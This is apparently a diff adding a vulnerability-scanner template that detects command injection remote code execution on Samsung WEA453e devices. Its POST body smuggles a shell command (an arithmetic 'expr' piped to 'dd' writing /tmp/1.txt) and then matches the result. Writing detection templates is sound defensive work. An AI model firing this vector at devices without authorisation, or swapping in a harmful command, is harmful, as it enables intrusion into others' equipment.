@@ -1,0 +1,32 @@
+id: poc-yaml-samsung-wea453e-rce
+info:
+  name: Samsung Wea453e Remote Code Execution
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    This template detects a remote code execution vulnerability in the Samsung WEA453e device by leveraging a command injection vector.
+variables:
+  r1: "{{rand_int(40000, 44800)}}"
+  r2: "{{rand_int(1140, 9144)}}"
+http:
+  - method: POST
+    path:
+      - "/download/tmp/1.txt"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: "command1=shell%3Aexpr {{r1}} - {{r2}}|dd of=/tmp/1.txt"
+    stop-at-first-match: true
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{to_number(r1) - to_number(r2)}}"
+      - type: regex
+        part: body
+        regex:
+          - "^(?!.*<).*$"
